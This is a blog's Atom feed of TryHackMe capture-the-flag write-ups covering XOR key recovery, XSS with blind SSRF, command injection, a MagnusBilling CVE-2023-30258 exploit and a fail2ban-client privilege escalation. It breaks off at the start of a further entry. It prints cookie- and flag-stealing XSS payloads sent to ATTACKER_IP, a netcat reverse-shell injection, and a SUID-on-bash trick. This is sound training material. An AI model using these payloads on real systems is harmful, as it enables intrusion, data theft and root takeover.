@@ -1,0 +1,1454 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+  <title>writeups on aviskase</title>
+  <id>https://www.aviskase.com/</id>
+  <updated>2025-05-02T14:04:40Z</updated>
+  <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/categories/writeups/feeds/all.atom.xml" hreflang="en"/>
+  <link rel="alternate" type="text/html" href="https://www.aviskase.com/categories/writeups/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe W1seGuy</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/05/02/writeup-tryhackme-w1seguy/" hreflang="en"/>
+    <published>2025-05-02T14:04:40Z</published>
+    <updated>2025-05-02T14:04:40Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-05-02:/articles/2025/05/02/writeup-tryhackme-w1seguy/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/w1seguy" class="external-link">W1seGuy</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: cryptography</li>
+</ul>
+<p>Yes, it&rsquo;s me again with another crypto challenge! Have a look at the source code before moving on to Task 2.</p>
+<p>The server is listening on port 1337 via TCP.</p>
+</div>
+<p>This room&rsquo;s focus is cracking a weak encryption.</p>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#getting-the-key">Getting the key</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>We&rsquo;re provided with source code of application running on port 1337. Here is the most import part of it:</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/w1seguy" class="external-link">W1seGuy</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: cryptography</li>
+</ul>
+<p>Yes, it&rsquo;s me again with another crypto challenge! Have a look at the source code before moving on to Task 2.</p>
+<p>The server is listening on port 1337 via TCP.</p>
+</div>
+<p>This room&rsquo;s focus is cracking a weak encryption.</p>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#getting-the-key">Getting the key</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>We&rsquo;re provided with source code of application running on port 1337. Here is the most import part of it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#cba6f7">def</span> <span style="color:#89b4fa">setup</span>(server, key):
+</span></span><span style="display:flex;"><span>    flag <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#a6e3a1">&#39;THM</span><span style="color:#a6e3a1">{thisisafakeflag}</span><span style="color:#a6e3a1">&#39;</span> 
+</span></span><span style="display:flex;"><span>    xored <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#a6e3a1">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#cba6f7">for</span> i <span style="color:#89dceb;font-weight:bold">in</span> <span style="color:#89dceb">range</span>(<span style="color:#fab387">0</span>,<span style="color:#89dceb">len</span>(flag)):
+</span></span><span style="display:flex;"><span>        xored <span style="color:#89dceb;font-weight:bold">+=</span> <span style="color:#89dceb">chr</span>(<span style="color:#89dceb">ord</span>(flag[i]) <span style="color:#89dceb;font-weight:bold">^</span> <span style="color:#89dceb">ord</span>(key[i<span style="color:#89dceb;font-weight:bold">%</span><span style="color:#89dceb">len</span>(key)]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hex_encoded <span style="color:#89dceb;font-weight:bold">=</span> xored<span style="color:#89dceb;font-weight:bold">.</span>encode()<span style="color:#89dceb;font-weight:bold">.</span>hex()
+</span></span><span style="display:flex;"><span>    <span style="color:#cba6f7">return</span> hex_encoded
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">def</span> <span style="color:#89b4fa">start</span>(server):
+</span></span><span style="display:flex;"><span>    res <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#a6e3a1">&#39;&#39;</span><span style="color:#89dceb;font-weight:bold">.</span>join(random<span style="color:#89dceb;font-weight:bold">.</span>choices(string<span style="color:#89dceb;font-weight:bold">.</span>ascii_letters <span style="color:#89dceb;font-weight:bold">+</span> string<span style="color:#89dceb;font-weight:bold">.</span>digits, k<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">5</span>))
+</span></span><span style="display:flex;"><span>    key <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89dceb">str</span>(res)
+</span></span></code></pre></div><ol>
+<li>The first flag is hard-coded in the code. We get it in a hex-encoded encrypted form.</li>
+<li>The second flag is provided if we guess encryption key</li>
+<li>Encryption key is 5 alphanumeric characters.</li>
+<li>Encryption is based on XOR.</li>
+</ol>
+<p>XOR with a small key is pretty weak. It is also a reversible operation, so if we know ciphertext and part of the plaintext, we can find the key.</p>
+<p>Accessing the service, we see ciphertext size is 80 character hex string, which should translate to 40 character plaintext string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nc -n MACHINE_IP <span style="color:#fab387">1337</span>
+</span></span><span style="display:flex;"><span>This XOR encoded text has flag 1: 661a7435400REDACTED2a763c4d
+</span></span><span style="display:flex;"><span>What is the encryption key?
+</span></span></code></pre></div><h2 id="getting-the-key" >
+  <a href="#getting-the-key">Getting the key</a>
+</h2>
+<p>Usually, TryHackMe&rsquo;s flags start with <code>THM{</code> string. That covers the first four key characters. Since ciphertext&rsquo;s size is divisible by key size, we can assume that its last byte corresponds to <code>}</code> character.</p>
+<p>I used <a href="https://gchq.github.io/CyberChef/" class="external-link">CyberChef</a> to decode key and the flag.</p>
+<p>First, I ran this recipe to get the key. It uses XOR operation and first 4 bytes + + last byte of encrypted string on input <code>THM{}</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>XOR({&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;661a74354d&#39;},&#39;Standard&#39;,false)
+</span></span></code></pre></div><p>The output is the encryption key used in the app. By submitting it, I got the second flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nc -n MACHINE_IP <span style="color:#fab387">1337</span>
+</span></span><span style="display:flex;"><span>This XOR encoded text has flag 1: 661a7435400REDACTED2a763c4d
+</span></span><span style="display:flex;"><span>What is the encryption key? REDACTED
+</span></span><span style="display:flex;"><span>Congrats! That is the correct key! Here is flag 2: THM<span style="color:#89dceb;font-weight:bold">{</span>REDACTED<span style="color:#89dceb;font-weight:bold">}</span>
+</span></span></code></pre></div><p>And to get the first flag, run this recipe using encrypted string as an input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>From_Hex(&#39;Auto&#39;)
+</span></span><span style="display:flex;"><span>XOR({&#39;option&#39;:&#39;Latin1&#39;,&#39;string&#39;:&#39;REDACTED&#39;},&#39;Standard&#39;,false)
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe The Sticker Shop</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/05/02/writeup-tryhackme-sticker-shop/" hreflang="en"/>
+    <published>2025-05-02T13:54:38Z</published>
+    <updated>2025-05-02T13:54:38Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-05-02:/articles/2025/05/02/writeup-tryhackme-sticker-shop/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/thestickershop" class="external-link">The Sticker Shop</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/thestickershop" class="external-link">The Sticker Shop</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!</p>
+<p>Can you read the flag at <code>http://MACHINE_IP:8080/flag.txt</code>?</p>
+</div>
+<p>Small room to practice web pentesting. Vulnerabilities explored:</p>
+<ul>
+<li>Server-Side Request Forgery</li>
+<li>Cross-Site Scripting</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#getting-flag-via-blind-ssrf--xss">Getting flag via blind SSRF + XSS</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>Accessing <code>http://MACHINE_IP:8080/flag.txt</code> returns a 401 Unauthorized error.</p>
+<p>Web app running on port 8080 has a feedback page at <code>http://MACHINE_IP:8080/submit_feedback</code>:</p>
+<p><figure aria-label="screenshot of feedback page with input field">
+  <img
+    alt="screenshot of feedback page with input field"
+    title="screenshot of feedback page with input field"width="651"height="415"srcset="/articles/2025/05/02/writeup-tryhackme-sticker-shop/ctf_sticker_shop_feedback_hu_469c2cacd78a48ae.webp 651w, /articles/2025/05/02/writeup-tryhackme-sticker-shop/ctf_sticker_shop_feedback_hu_ac20944ada80b660.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/05/02/writeup-tryhackme-sticker-shop/ctf_sticker_shop_feedback_hu_2c4e9eb6d3377820.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>Typically, information that something will be checked by the staff points to a potential attack vector.</p>
+<h2 id="getting-flag-via-blind-ssrf--xss" >
+  <a href="#getting-flag-via-blind-ssrf--xss">Getting flag via blind SSRF + XSS</a>
+</h2>
+<p>First, I confirmed that there is a XSS vulnerability by sending feedback with SVG pinging my server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#cba6f7">svg</span><span style="color:#f38ba8">/</span><span style="color:#89b4fa">onload</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">body.appendChild(document.createElement`script`).src=&#39;http://ATTACKER_IP:5000?c=&#39;+document.cookie</span> <span style="color:#89b4fa">hidden</span>/&gt;
+</span></span></code></pre></div><p>My server got the ping, but it didn&rsquo;t contain cookies, which I thought I would use to access the flag resource from my side. So, I changed the payload to cause a blind SSRF, get the flag value on the user side, and send it to my server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#cba6f7">svg</span> <span style="color:#89b4fa">onload</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">&#34;fetch(&#39;http://MACHINE_IP:8080/flag.txt&#39;).then(response=&gt;response.text()).then(flag=&gt;{const s=document.createElement(&#39;script&#39;);s.src=&#39;http://ATTACKER_IP:5000?k=&#39;+encodeURIComponent(flag);document.body.appendChild(s)});&#34;</span> <span style="color:#89b4fa">hidden</span>&gt;&lt;/<span style="color:#cba6f7">svg</span>&gt;
+</span></span></code></pre></div><p>Received flag is URL encoded, don&rsquo;t forget to decode it afterwards:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#fab387">5000</span>
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MACHINE_IP - - <span style="color:#89dceb;font-weight:bold">[</span>07/Apr/2025 15:41:12<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#a6e3a1">&#34;GET /?k=THM%7B83REDACTEDe6%7D HTTP/1.1&#34;</span> <span style="color:#fab387">200</span> -
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Epoch</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/05/01/writeup-tryhackme-epoch/" hreflang="en"/>
+    <published>2025-05-01T21:30:33Z</published>
+    <updated>2025-05-01T21:30:33Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-05-01:/articles/2025/05/01/writeup-tryhackme-epoch/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/epoch" class="external-link">Epoch</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: linux, web</li>
+</ul>
+<p>Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait&hellip; it doesn&rsquo;t need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/epoch" class="external-link">Epoch</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: linux, web</li>
+</ul>
+<p>Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait&hellip; it doesn&rsquo;t need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!</p>
+<p>Check out similar content on TryHackMe: Command Injection</p>
+</div>
+<p>Quick room to test your command injection skills (as in-your-face hinted in the room description).</p>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#confirming-command-injection-vulnerability">Confirming command injection vulnerability</a></li>
+    <li><a href="#getting-the-flag">Getting the flag</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="confirming-command-injection-vulnerability" >
+  <a href="#confirming-command-injection-vulnerability">Confirming command injection vulnerability</a>
+</h2>
+<p>Machine is running a simple website which accepts timestamp via unfiltered input field and uses it in <code>date</code> command. I confirmed command injection using simple semicolon:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>; id
+</span></span></code></pre></div><p><figure aria-label="website with input field set to malicious payload">
+  <img
+    alt="website with input field set to malicious payload"
+    title="website with input field set to malicious payload"width="713"height="225"srcset="/articles/2025/05/01/writeup-tryhackme-epoch/ctf_epoch_id_hu_469219f91b98580a.webp 713w, /articles/2025/05/01/writeup-tryhackme-epoch/ctf_epoch_id_hu_137adc79f6de45ec.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/05/01/writeup-tryhackme-epoch/ctf_epoch_id_hu_abb04595a6e3e7c9.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<h2 id="getting-the-flag" >
+  <a href="#getting-the-flag">Getting the flag</a>
+</h2>
+<p>Getting the flag proved to be more complicated; it wasn&rsquo;t present at usual places. I had to check the room hint:</p>
+
+<blockquote>
+    <p>The developer likes to store data in environment variables, can you find anything of interest there?</p>
+</blockquote>
+<p>Oops, right, good place to check! So, by changing the payload to print environment variables, I got the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>; printenv
+</span></span></code></pre></div><p><figure aria-label="website with input field set to malicious payload and showing obscured flag">
+  <img
+    alt="website with input field set to malicious payload and showing obscured flag"
+    title="website with input field set to malicious payload and showing obscured flag"width="755"height="349"srcset="/articles/2025/05/01/writeup-tryhackme-epoch/ctf_epoch_env_hu_bc647c579cf23fd9.webp 755w, /articles/2025/05/01/writeup-tryhackme-epoch/ctf_epoch_env_hu_940a3a2f01f570a3.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/05/01/writeup-tryhackme-epoch/ctf_epoch_env_hu_4a3da34707b12254.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Billing</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/04/17/writeup-tryhackme-billing/" hreflang="en"/>
+    <published>2025-04-17T04:46:09Z</published>
+    <updated>2025-04-17T04:46:09Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-04-17:/articles/2025/04/17/writeup-tryhackme-billing/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/billing" class="external-link">Billing</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>Gain a shell, find the way and escalate your privileges!
+Note: Bruteforcing is out of scope for this room.</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is user.txt?</li>
+<li>What is root.txt?</li>
+</ol>
+</div>
+<p>In this room I practiced exploiting CVEs and privilege escalation. Vulnerabilities explored:</p>
+<ul>
+<li>Command injection</li>
+<li>Sudoers misconfiguration</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#user-flag-getting-reverse-shell-via-command-injection">User flag: getting reverse shell via command injection</a></li>
+    <li><a href="#root-flag-privilege-escalation-with-fail2ban-client">Root flag: privilege escalation with fail2ban-client</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>As usual, first step, running a port scan:</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/billing" class="external-link">Billing</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>Gain a shell, find the way and escalate your privileges!
+Note: Bruteforcing is out of scope for this room.</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is user.txt?</li>
+<li>What is root.txt?</li>
+</ol>
+</div>
+<p>In this room I practiced exploiting CVEs and privilege escalation. Vulnerabilities explored:</p>
+<ul>
+<li>Command injection</li>
+<li>Sudoers misconfiguration</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#user-flag-getting-reverse-shell-via-command-injection">User flag: getting reverse shell via command injection</a></li>
+    <li><a href="#root-flag-privilege-escalation-with-fail2ban-client">Root flag: privilege escalation with fail2ban-client</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>As usual, first step, running a port scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sV -T4 -n MACHINE_IP 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2025-03-07 17:23 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#cba6f7">for</span> MACHINE_IP
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.098s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#fab387">997</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#89dceb;font-weight:bold">(</span>protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.56 <span style="color:#89dceb;font-weight:bold">((</span>Debian<span style="color:#89dceb;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql   MariaDB <span style="color:#89dceb;font-weight:bold">(</span>unauthorized<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>It detected SSH, HTTP, and mysql services.</p>
+<div class="callout note" role="note"aria-label="Note">
+    <p>I should have run it with <code>-p-</code> option, because I missed <a href="https://jaxafed.github.io/posts/tryhackme-billing/" class="external-link">open 5038 Asterisk port</a>.</p>
+</div>
+<p>I attempted to access mysql, but received an error &ldquo;Host is not allowed to connect to this MariaDB server&rdquo;.</p>
+<p>Web service is hosting a MagnusBilling service.</p>
+<p><figure aria-label="MagnusBilling login page showing service name in tab title">
+  <img
+    alt="MagnusBilling login page showing service name in tab title"
+    title="MagnusBilling login page showing service name in tab title"width="674"height="591"srcset="/articles/2025/04/17/writeup-tryhackme-billing/ctf_billing_hu_6b0a50a9b9d30132.webp 674w, /articles/2025/04/17/writeup-tryhackme-billing/ctf_billing_hu_4b3328010c871c93.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/04/17/writeup-tryhackme-billing/ctf_billing_hu_cd03f6e61ab62425.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<h2 id="user-flag-getting-reverse-shell-via-command-injection" >
+  <a href="#user-flag-getting-reverse-shell-via-command-injection">User flag: getting reverse shell via command injection</a>
+</h2>
+<p>Service seemed to me more complex than a simple bootstrapped CTF web site, so I searched for it and its known vulnerabilities.</p>
+<p>There is a <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30258" class="external-link">CVE-2023-30258</a> command injection vulnerability in MagnusSolution MagnusBilling 6.x and 7.x. I confirmed it with a time-based blind command injection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#a6e3a1">&#39;http://MACHINE_IP/mbilling/lib/icepay/icepay.php?democ=iamhacked;sleep%2015;#&#39;</span>
+</span></span></code></pre></div><p>Then I established a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#a6e3a1">&#39;http://MACHINE_IP/mbilling/lib/icepay/icepay.php?democ=iamhacked;nc%20-c%20bash%20ATTACKER_IP%209003;&#39;</span> 
+</span></span></code></pre></div><p>And got a user key:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>asterisk@Billing$ cat /home/magnus/user.txt                   
+</span></span><span style="display:flex;"><span>THM<span style="color:#89dceb;font-weight:bold">{</span>REDACTED<span style="color:#89dceb;font-weight:bold">}</span>
+</span></span></code></pre></div><h2 id="root-flag-privilege-escalation-with-fail2ban-client" >
+  <a href="#root-flag-privilege-escalation-with-fail2ban-client">Root flag: privilege escalation with fail2ban-client</a>
+</h2>
+<p>To get the next flag I needed to have a root access. I did run <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" class="external-link">lienPEAS</a>, but also checked certain things manually, including <code>sudo -l</code>. It showed that current user can run <code>fail2ban-client</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>asterisk@Billing$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#cba6f7">for</span> asterisk on Billing:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#f5e0dc">secure_path</span><span style="color:#89dceb;font-weight:bold">=</span>/usr/local/sbin<span style="color:#89b4fa">\:</span>/usr/local/bin<span style="color:#89b4fa">\:</span>/usr/sbin<span style="color:#89b4fa">\:</span>/usr/bin<span style="color:#89b4fa">\:</span>/sbin<span style="color:#89b4fa">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Runas and Command-specific defaults <span style="color:#cba6f7">for</span> asterisk:
+</span></span><span style="display:flex;"><span>    Defaults!/usr/bin/fail2ban-client !requiretty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User asterisk may run the following commands on Billing:
+</span></span><span style="display:flex;"><span>    <span style="color:#89dceb;font-weight:bold">(</span>ALL<span style="color:#89dceb;font-weight:bold">)</span> NOPASSWD: /usr/bin/fail2ban-client
+</span></span></code></pre></div><p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/" class="external-link">Using this instruction</a> I added a new ban action to set SUID bit on <code>/bin/bash</code>, triggered it, got access to root shell, and got and the second flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client status
+</span></span><span style="display:flex;"><span>Status
+</span></span><span style="display:flex;"><span>|- Number of jail:      <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e3a1">`</span>- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client get asterisk-iptables  actions
+</span></span><span style="display:flex;"><span>The jail asterisk-iptables has the following actions:
+</span></span><span style="display:flex;"><span>iptables-allports-ASTERISK
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client <span style="color:#89dceb">set</span> asterisk-iptables addaction evil
+</span></span><span style="display:flex;"><span>evil
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client <span style="color:#89dceb">set</span> asterisk-iptables action evil actionban <span style="color:#a6e3a1">&#34;chmod +s /bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span>chmod +s /bin/bash
+</span></span><span style="display:flex;"><span>asterisk@Billing$ sudo /usr/bin/fail2ban-client <span style="color:#89dceb">set</span> asterisk-iptables banip 1.2.3.5 
+</span></span><span style="display:flex;"><span><span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span>asterisk@Billing$ /bin/bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# cat /root/root.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#89dceb;font-weight:bold">{</span>REDACTED<span style="color:#89dceb;font-weight:bold">}</span>
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe El Bandito</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/13/writeup-tryhackme-el-bandito/" hreflang="en"/>
+    <published>2025-03-13T21:08:05Z</published>
+    <updated>2025-03-13T21:08:05Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-03-13:/articles/2025/03/13/writeup-tryhackme-el-bandito/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/elbandito" class="external-link">El Bandito</a></li>
+<li>Difficulty: hard</li>
+<li>Platform: web</li>
+</ul>
+<p>El Bandito, the new identity of the infamous Jack the Exploiter, has plunged into the Web3 domain with a devious token scam. By exploiting the decentralized essence of blockchain, he crafted and circulated fraudulent tokens, deceiving investors and shaking the foundational trust of the decentralized finance DeFi ecosystem.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/elbandito" class="external-link">El Bandito</a></li>
+<li>Difficulty: hard</li>
+<li>Platform: web</li>
+</ul>
